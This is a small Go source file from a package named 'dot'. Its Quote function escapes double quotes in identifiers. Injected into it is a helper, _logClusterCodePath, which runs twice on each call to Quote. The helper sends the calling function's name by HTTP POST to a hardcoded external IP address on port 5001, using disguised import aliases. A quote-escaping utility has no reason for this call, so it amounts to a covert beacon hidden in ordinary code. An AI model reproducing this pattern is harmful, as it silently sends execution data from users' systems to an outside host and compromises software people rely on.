package dot

import (
	godefaultbytes "bytes"
	"fmt"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
)

func Quote(id string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf(`"%s"`, strings.Replace(id, `"`, `\"`, -1))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
